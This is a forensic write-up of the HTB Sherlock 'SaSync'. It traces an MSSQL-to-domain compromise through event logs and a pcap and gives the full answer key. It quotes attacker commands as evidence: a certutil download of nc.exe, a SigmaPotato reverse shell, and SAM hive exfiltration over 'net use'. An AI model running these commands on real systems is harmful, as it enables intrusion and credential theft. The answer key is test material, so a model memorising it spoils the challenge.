---
title: "Writeup - HTB Sherlock SaSync (MSSQL to Child-Domain Compromise)"
category: sherlocks
subcategory: active-directory
type: writeup
tags: [sherlock, sasync, htb, hackthebox, dfir, mssql, xp-cmdshell, brute-force, netcat, certutil, sigmapotato, seimpersonate, reg-save-sam, net-use, password-spray, constrained-delegation, s4u2proxy, impacket-psexec, mimikatz, dcsync, get-adtrust, evtx, pcap, tds]
difficulty: medium
summary: "SA brute force on MSSQL, xp_cmdshell, nc reverse shell, SigmaPotato to SYSTEM, SAM exfil over SMB, domain spray, S4U2Proxy impersonation of Administrator, psexec to the DC, DCSync, trust enumeration."
tools: [evtx, jq, tshark, 7z]
ctf:
  name: "Hack The Box Sherlocks"
  year: 2026
  challenge: "SaSync"
related: [sherlock-triage, windows-evtx-hunting, ad-attack-detection-event-ids, pcap-dfir-tshark, evtx-to-jsonl-timeline]
---

## Challenge

HTB Sherlock 1692, Medium, DFIR. The scenario is a neglected child domain (`DB-TEST.SHANOCORP.HTB`), kept for testing, with insecure configurations. Status: all 17 tasks solved.

## Files

```text
SaSync.zip (password hacktheblue)
  SqlSvr/C/{$MFT,$Extend/$J,Windows/System32/Logs/*.evtx}   SQL server 192.168.186.139
  DC2/C/{$MFT,$Extend/$J,Windows/System32/Logs/*.evtx}      child DC  192.168.186.30
  shanocorp_traffic.pcapng                                  19:25:27-19:40:47 UTC
```

Hosts: `.135` = compromised dev box / attacker, `.139` = SQLSVR, `.30` = DC2 (child DC), `.10` = DC1 (parent `SHANOCORP.HTB`).
There is no Sysmon, but Security 4688 has command lines and PowerShell 4104 is on.

## Recon

```sh
7z x -phacktheblue SaSync.zip
python3 evtxkit.py dump SqlSvr/C/Windows/System32/Logs out/SqlSvr
python3 evtxkit.py dump DC2/C/Windows/System32/Logs out/DC2
python3 evtxkit.py timeline out/SqlSvr --since 2026-03-09T19:25 --until 2026-03-09T19:31
python3 evtxkit.py timeline out/DC2 --since 2026-03-09T19:30 --until 2026-03-09T19:43
TZ=UTC tshark -r shanocorp_traffic.pcapng -t ud -Y tds.query -T fields -e _ws.col.Time -e tds.query
```

## Attack chain and answers

| # | Question | Answer | Evidence |
|---|---|---|---|
| 1 | Earliest malicious activity | `2026-03-09 19:26:26` | pcap: nmap SYN scan .135 -> .139 (Win=1024, one src port). ARP at 19:26:20 was not the accepted answer |
| 2 | Internal IP where the attack originated | `192.168.186.135` | 18456 `[CLIENT: 192.168.186.135]` |
| 3 | Service attacked | `MSSQL` | 18456 burst for `sa`, sqlservr.exe spawning cmd |
| 4 | First remote command executed | `2026-03-09 19:27:24` | **pcap** TDS `exec xp_cmdshell 'dir C:\'`. The host 4688 says 19:27:26 and was rejected |
| 5 | Parent process of the foothold | `C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Binn\sqlservr.exe` | 4688 ParentProcessName |
| 6 | Reverse shell binary URL | `http://192.168.186.135:9999/nc.exe` | 4688 `certutil -urlcache -split -f` |
| 7 | Reverse shell interactive | `2026-03-09 19:27:59` | **pcap** SYN .139 -> .135:4444 and the `Microsoft Windows [Version` banner. 4688 shows 19:28:01 |
| 8 | PrivEsc command | `.\SigmaPotato.exe --revshell 192.168.186.135 5555` | 4688 after `whoami /priv` (SeImpersonate) |
| 9 | Exfil staging command | `net use n: \\192.168.186.135\DevMachine /user:dev01 dev01` | 4104/4688. Then `copy sam/system/security n:\` |
| 10 | User profile enumeration | `2026-03-09 19:30:00` | 4104 `dir C:\Users` |
| 11 | First domain account via credential stuffing | `2026-03-09 19:31:01` | DC2 4776/4625 spray, then 4624 `rumen.katincharov` NTLM success |
| 12 | Second account without password | `DB-TEST.SHANOCORP.HTB\websvc` | 4768 TGT for websvc from .135 (hash from the SAM/LSA dump), then 4769 S4U |
| 13 | Logon GUID of the escalated session | `c95ca50a-461f-771a-5f05-918141638369` | DC2 4624 Administrator, `TransmittedServices=websvc@DB-TEST.SHANOCORP.HTB` |
| 14 | Feature + Kerberos extension | `Kerberos constrained delegation, S4U2Proxy` | same event |
| 15 | Lateral movement to the DC (SYSTEM) | `2026-03-09 19:36:57` | DC2 System 7045 service `vpHM` = `%systemroot%\FyPDJNvh.exe` (impacket psexec) |
| 16 | Misconfiguration abused for domain-wide compromise | `2026-03-09 19:39:50` | 4662 with `1131f6ad` (Get-Changes-All) = DCSync after `mimikatz.exe` at 19:38:03 |
| 17 | Trust enumeration command | `Get-ADTrust -Filter *` | DC2 4104 at 19:40:44 |

Afterwards: `Get-ADForest`, then a 4769 for `Administrator@SHANOCORP.HTB` at 19:41:46, which is the child-to-parent (ExtraSids) move toward the forest root.

## Key queries

```sh
# xp_cmdshell children
awk -F'\t' '$3 ~ /sqlservr.exe/' 4688.tsv
# brute force source
jq -r 'select((.Event.System.EventID|if type=="object" then ."#text" else . end)==18456) | .Event.EventData.Data."#text"[2]' out/SqlSvr/Application.jsonl | sort | uniq -c
# the S4U logon + GUID
jq -r 'select(.Event.System.EventID==4624) | .Event.EventData as $e | select(($e.TransmittedServices//"-")|test("@")) | [._ts,$e.TargetUserName,$e.IpAddress,$e.LogonGuid]|@tsv' out/DC2/Security.jsonl
# psexec service
jq -r 'select((.Event.System.EventID|if type=="object" then ."#text" else . end)==7045) | [._ts,.Event.EventData.ServiceName,.Event.EventData.ImagePath]|@tsv' out/DC2/System.jsonl
# reverse shell time in the pcap
TZ=UTC tshark -r shanocorp_traffic.pcapng -t ud -Y 'tcp.port==4444 && tcp.flags.syn==1' -T fields -e _ws.col.Time -e ip.src -e ip.dst
```

## Takeaway

- **Timestamps: the pcap won.** Host clocks ran about 2s ahead of the capture. For the "first command", "reverse shell" and "earliest activity" questions the network-observed time was accepted and the 4688 time was rejected. Always compute the skew from one event visible in both sources.
- "Earliest malicious activity" was the port scan in the pcap, not the brute force in the logs.
- The masks give the answer shape away: `XXXXX` = MSSQL, and `XX-XXXX.XXXXXXXXX.XXX\xxxxxx` = child FQDN plus the lower-case account name.
- On the DC, `TransmittedServices` on a 4624 is the tell for S4U2Proxy. Its `LogonGuid` ties the whole impersonated session together.
- A random 8-char exe in `C:\Windows` started by services.exe is impacket psexec (7045 gives the time).
- A DCSync run from SYSTEM on a DC shows up as `DC$` in 4662. Correlate it with mimikatz in 4688 and pick the event that has `1131f6ad`.
- When scripting submissions, `read -r` or JSON-encode the answers, and pace them (HTB returns `Too Many Attempts.`).
